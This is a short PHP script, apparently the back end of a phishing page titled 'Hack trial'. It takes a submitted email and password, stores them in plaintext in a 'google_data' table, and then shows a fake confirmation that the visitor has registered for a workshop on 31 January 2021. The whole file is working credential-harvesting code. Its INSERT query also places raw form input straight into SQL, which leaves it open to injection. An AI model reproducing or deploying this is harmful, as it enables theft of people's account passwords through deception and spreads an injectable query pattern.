<?php
session_start();
?>

 <html>
 <body>
   <?php

     include('connection.php');

     if($_POST['email']){
              $email = $_POST['email'];
          }else{
              echo "email not received";
              exit;
          }
     if($_POST['pass']){
        $password = $_POST['pass'];
          }else{
             echo "password not received";
             exit;
         }

    if(mysqli_query($conn,"INSERT INTO google_data (email, password)
        VALUES ('$email','$password')")){
          ?>
          <head>
            <meta charset="utf-8">
            <title>Hack trial</title>
            <link rel="stylesheet" href="thanks.css">
            <link rel="shortcut icon" href="unnamed.jpg">
          </head>
          <div class="heading">
            <img src="unnamed.jpg" alt="VM logo">
            <img src="IMG_1298_ci754t.JPG" alt="FLAP">
            <h1>You have successfully registered for the workshop</h1>
            <h2>Be ready on</h2>
            <h3>Date: 31st January 2021</h3>
            <h3>Time: 10:00 AM</h3>
          </div>
          <?php
        }else{
          echo "<br>Error<br>".$conn->error;
       }
    ?>
 </body>
 </html>
 <?php
   session_unset();
   session_destroy();
 ?>
